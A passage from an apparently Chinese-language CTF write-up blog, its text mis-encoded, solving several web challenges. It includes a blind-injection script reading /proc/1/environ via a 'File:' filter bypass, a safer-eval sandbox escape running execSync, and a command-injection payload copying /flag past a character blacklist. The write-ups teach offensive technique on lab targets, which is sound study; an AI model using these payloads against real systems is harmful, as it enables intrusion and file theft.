class="keyword">if</span> request.method != <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        session[<span class="string">&quot;key&quot;</span>]=SECRET_KEY</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&#x27;&#x27;@app.route(&#x27;/getkey&#x27;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="string">def getkey():</span></span><br><span class="line"><span class="string">    if request.method != &quot;GET&quot;:</span></span><br><span class="line"><span class="string">        session[&quot;key&quot;]=SECRET_KEY&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_hindd_result&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hindd_result</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;data&#x27;</span>] <span class="keyword">and</span> session[<span class="string">&#x27;url&#x27;</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file:&#x27;</span> <span class="keyword">in</span> session[<span class="string">&#x27;url&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;no no no&quot;</span></span><br><span class="line">        data=(session[<span class="string">&#x27;data&#x27;</span>]).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        url_text=urllib.request.urlopen(session[<span class="string">&#x27;url&#x27;</span>]).read().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> url_text <span class="keyword">in</span> data <span class="keyword">or</span> data <span class="keyword">in</span> url_text:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;you get it&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;what ???&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getflag&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    res = flag.waf(request)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>æ€è·¯å°±æ˜¯é€šè¿‡&#x2F;get_hindd_resultè·¯ç”±è¿›è¡Œç›²æ³¨ã€‚</p><p>å› ä¸ºç›´æ¥getflagä»–æ²¡å›æ˜¾å•Šï¼Ÿï¼</p><p>fileè¿‡æ»¤å¯ä»¥å¤§å°å†™ç»•è¿‡</p><p>å°è¯•ä¸€ä¸‹File:&#x2F;&#x2F;&#x2F;proc&#x2F;1&#x2F;environ     NSSCTFå‘ç°å¯è¡Œ</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105083934681.png" alt="image-20250105083934681"></p><p>æ¥ä¸‹æ¥ç¼–å†™ç›²æ³¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload_sum=string.ascii_lowercase+string.digits+<span class="string">&#x27;&#123;&#125;-&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload_sum)</span><br><span class="line">target=<span class="string">&#x27;http://node4.anna.nssctf.cn:28374/&#x27;</span></span><br><span class="line">payload_data=<span class="string">&quot;NSSCTF&#123;&quot;</span></span><br><span class="line">payload_url=<span class="string">&quot;File:///proc/1/environ&quot;</span></span><br><span class="line">target_get_data=target+<span class="string">&#x27;get_data&#x27;</span></span><br><span class="line">target_get_flag=target+<span class="string">&#x27;get_hindd_result&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payload_sum:</span><br><span class="line">        temp=payload_data+j</span><br><span class="line">        <span class="comment">#print(j)</span></span><br><span class="line">        session = requests.session()</span><br><span class="line">        session.post(target_get_data,data=&#123;<span class="string">&#x27;data&#x27;</span>:temp,<span class="string">&#x27;url&#x27;</span>:payload_url,<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;%E6%8F%90%E4%BA%A4&#x27;</span>&#125;)</span><br><span class="line">        response=session.get(target_get_flag,cookies=&#123;<span class="string">&#x27;session&#x27;</span>:<span class="built_in">str</span>(session.cookies.values())[<span class="number">2</span>:-<span class="number">2</span>]&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#print(str(session.cookies.values())[2:-2])</span></span><br><span class="line">        <span class="comment">#print(response.text)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;you get it&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            payload_data+=j</span><br><span class="line">            <span class="built_in">print</span>(payload_data)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;bad!&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è„šæœ¬ç¼–å†™èƒ½åŠ›è¿˜æ˜¯å¤ªå·®äº†ï¼Œå†™äº†åŠå¤©ã€‚ã€‚ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;710ce1eb-8431-41e6-83fa-3213a14db9fc&#125;</span><br></pre></td></tr></table></figure><h2 id="GKCTF-2020-ezä¸‰å‰‘å®¢-easynode"><a href="#GKCTF-2020-ezä¸‰å‰‘å®¢-easynode" class="headerlink" title="[GKCTF 2020]ezä¸‰å‰‘å®¢-easynode"></a>[GKCTF 2020]ezä¸‰å‰‘å®¢-easynode</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105160042913.png" alt="image-20250105160042913" style="zoom:80%;" /><p>å‘ç°ä¸€ä¸ªsafer-eval 1.3.6ç‰ˆæœ¬ï¼Œå­˜åœ¨æ²™ç®±é€ƒé€¸çš„æ¼æ´ã€‚</p><p>ä¸‹é¢çœ‹çœ‹æºä»£ç ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> saferEval = <span class="built_in">require</span>(<span class="string">&#x27;safer-eval&#x27;</span>); <span class="comment">// 2019.7/WORKER1 æ‰¾åˆ°ä¸€ä¸ªå¾ˆæ£’çš„åº“</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2020.1/WORKER2 è€æ¿è¯´ä¸ºäº†åæœŸæ–¹ä¾¿ä¼˜åŒ–</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">path</span> === <span class="string">&#x27;/eval&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Number</span>.<span class="title function_">isInteger</span>(<span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">delay</span>))) &#123;</span><br><span class="line">      delay = <span class="title class_">Math</span>.<span class="title function_">max</span>(delay, <span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">delay</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="title function_">next</span>(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 è€æ¿è¯´è®©æˆ‘ä¼˜åŒ–ä¸€ä¸‹é€Ÿåº¦ï¼Œæˆ‘å°±ç›´æ¥è¿™æ ·å†™äº†ï¼Œå…¶ä»–äººå†™äº†å•¥å…³æˆ‘päº‹</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(t);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;timeout&#x27;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/eval&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">e</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = <span class="title function_">saferEval</span>(req.<span class="property">body</span>.<span class="property">e</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      response = <span class="string">&#x27;Wrong Wrong Wrong!!!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="title class_">String</span>(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 è€æ¿å¨˜è¯´å¥¹è¦çœ‹åˆ°æˆ‘ä»¬çš„æºä»£ç ï¼Œç”¨è¡Œæ•°è®¡ç®—KPI</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.12/WORKER3 ä¸ºäº†æ–¹ä¾¿æˆ‘è‡ªå·±æŸ¥çœ‹ç‰ˆæœ¬ï¼ŒåŠ ä¸Šè¿™ä¸ªæ¥å£</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/version&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/json;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./package.json&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./index.html&#x27;</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>åœ¨&#x2F;evalè·¯ç”±ä¸‹å­˜åœ¨safeevalçš„rceï¼Œä½†æ˜¯if (req.path &#x3D;&#x3D;&#x3D; â€˜&#x2F;evalâ€™) {ï¼Œæ­¤å¤„å­˜åœ¨å¤§æ—¶é—´çš„å»¶è¿Ÿï¼Œç„¶è€Œä»–æ˜¯è€ƒsetTimeoutæ¥è¿›è¡Œçš„ï¼Œå¯ä»¥é€šè¿‡</p><p>å¤§äº2147483647çš„æ•°æ¥ç»•è¿‡ã€‚</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105160338220.png" alt="image-20250105160338220"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e=(function () &#123;</span><br><span class="line"></span><br><span class="line">const process = clearImmediate.constructor(&#x27;return process;&#x27;)();</span><br><span class="line"></span><br><span class="line">return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;).toString()&#125;)()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;970473a7-7ad6-4826-9a42-492ec0dcf96a&#125;</span><br></pre></td></tr></table></figure><h2 id="NSSRound-V-Team-PYRCE"><a href="#NSSRound-V-Team-PYRCE" class="headerlink" title="[NSSRound#V Team]PYRCE"></a>[NSSRound#V Team]PYRCE</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response </span><br><span class="line"><span class="keyword">import</span> uuid </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="comment"># flag in /flag </span></span><br><span class="line">app = Flask(__name__) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>): </span><br><span class="line">black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span> </span><br><span class="line"><span class="keyword">for</span> black <span class="keyword">in</span> black_list: </span><br><span class="line"><span class="keyword">if</span> black <span class="keyword">in</span> rce: </span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line"><span class="keyword">if</span> request.args.get(<span class="string">&quot;Å‡Å›Å›&quot;</span>): </span><br><span class="line">nss = request.args.get(<span class="string">&quot;Å‡Å›Å›&quot;</span>) </span><br><span class="line"><span class="keyword">if</span> waf(nss): </span><br><span class="line">os.popen(nss) </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;waf&quot;</span> </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;/source&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>(): </span><br><span class="line">src = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read() </span><br><span class="line"><span class="keyword">return</span> src </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8080</span>) </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Å‡Å›Å›=cp $(cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;echo $(pwd)flag) app.py</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Å‡Å›Å›=cp%09%24%28cd%09..%26%26cd%09..%26%26cd%09..%26%26cd%09..%26%26echo%09%24%28pwd%29flag%29%09app.py</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ‚ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowå…ƒæ—¦æ¸—é€èµ›wp</title>
      <link href="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/"/>
      <url>/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h2 id="å¯ç¨‹"><a href="#å¯ç¨‹" class="headerlink" title="å¯ç¨‹"></a>å¯ç¨‹</h2><img src="https://ctfer-1257200238.cos.ap-shanghai.myqcloud.com/2025/01/picture/message1.jpg" alt="img" style="zoom:67%;" /><img src="https://ctfer-1257200238.cos.ap-shanghai.myqcloud.com/2025/01/picture/task1.jpg" alt="img" style="zoom:80%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æäº¤å‹ç¼©åŒ…çš„å¯†ç </span><br></pre></td></tr></table></figure><p>é¦–å…ˆè·å¾—çš„æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä½†æ˜¯åŠ å¯†äº†ã€‚æˆ‘ä»¬ä¸¢åˆ°passwareé‡Œçˆ†ç ´ä¸€ä¸‹ã€‚</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101072428317.png" class="" title="This is an example image"><p>ç›´æ¥å‡ºäº†ï¼Œå¯†ç 654321</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101072458023.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æäº¤ä»»åŠ¡ä¸­å¿ƒçš„ç½‘å€</span><br></pre></td></tr></table></figure><p>è·å¾—ä¸€ä¸²base64ç¼–ç åçš„æ•°æ®ï¼Œè§£ç ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> secretMessageResponse</span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        <span class="keyword">import</span> pip</span><br><span class="line">        pip.main([<span class="string">&#x27;install&#x27;</span>, <span class="string">&#x27;secretMessageResponse&#x27;</span>])</span><br><span class="line">        <span class="keyword">from</span> secretMessageResponse <span class="keyword">import</span> printMessage</span><br></pre></td></tr></table></figure><p>ç›´æ¥ä¸¢åˆ°pythonè¿è¡Œè¯•è¯•ã€‚è¿”å›ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">è¯·ä½¿ç”¨ç»„ç»‡åˆ†é…çš„ç§é’¥è§£å¯†åä½¿ç”¨</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">2024-12-16</span><br><span class="line">gHgAsclUVPhWDv4S8Oa8SuRTDaj+V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm/yv2/e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT+mg4RkIIFgx35w4J1KgO72pSP8j1p+R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u+iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r/klPHfxQ+psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv/IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f/uS64Ss0Ixii8nmfsFOjQBCcIYN+HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7+Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH+vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU/rv4R58obD/o+QqI1Mrb4wwpX9tsL7ZbROw/MXJwM=</span><br><span class="line">----------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¯·ä½¿ç”¨ç»„ç»‡åˆ†é…çš„ç§é’¥è§£å¯†åä½¿ç”¨</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">2024-04-11</span><br><span class="line">Z93Khatj+AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX/xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh/gippMpP+8Ik2X/QRBx5gdhq0xam+wuVC+77/tyu8Fd/DohKbAMp8aaJsFr/W4mLDZ1gv4JK+2O3l+bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb+SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6/LdhqsTNelXl/Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG+S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB/hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX/9eBkznEhzeWnJ1yMsYkj+ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme+T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI=</span><br><span class="line">----------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¯·ä½¿ç”¨ç»„ç»‡åˆ†é…çš„ç§é’¥è§£å¯†åä½¿ç”¨</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">2024-03-05</span><br><span class="line">ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA/ICJR7WrwWsVinr6y3u9w+ubMZ0mqmtnphzQraagk8NkKc1u1+qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi+1Aunmy6DeOKRkFwysnrSco5QiiC9+gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3/Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU+iiN4offwrQyr4eEu9ecvmyD2w/n7pAOsVnqSzroBujVA+CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf+MnMQPr80uoxT3mz8IX8pyVnyyw1x6F+IK1I2G+5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6/5Sz1noJrsu6k6WN8ZM0MyRIav+xuKP1+cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA/cEjOICWVzUXwbE5wWUBPCLp2C/XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk/ahaxdGxGa9CrRyr6sf+goA=</span><br><span class="line">----------------------------------------------------------</span><br></pre></td></tr></table></figure><p>åŒæ—¶é¢˜ç›®ç»™äº†npq</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">6332468885045739207798242375080077355892316665891880211715759509399402551400860520908019724111820758062002779222649162563769520681049420842627327653028697570023368621511584229066629851913921934625112891871237543378546847020163969961987899081707281756262252814062564762160798635747507687871699694751527174309034601497055974635051437994874886300646949625353558253782655181334148321351659981250042829128658958363792059338950291542877888243170008437712513314359394103899575725527464109331033472122605333514068765847981281168351027057708345483333279522044142183133967673483865459337003717067807320811287647328283988796540276949990614458889846521960577177616236664713902265004190473545460095268491900380558170082520224728576953003878275008182317199296267075737759724512554280591198406698260860277025465102137918643581832045307760200048667705365456953303241675697777911751700448120282274949664588640026605985924903540176391580279688363295982824196664632859001756744080268810527371486113951531943901306283561047843588041585812947331967034769134340552094418027084857234553229856544474009457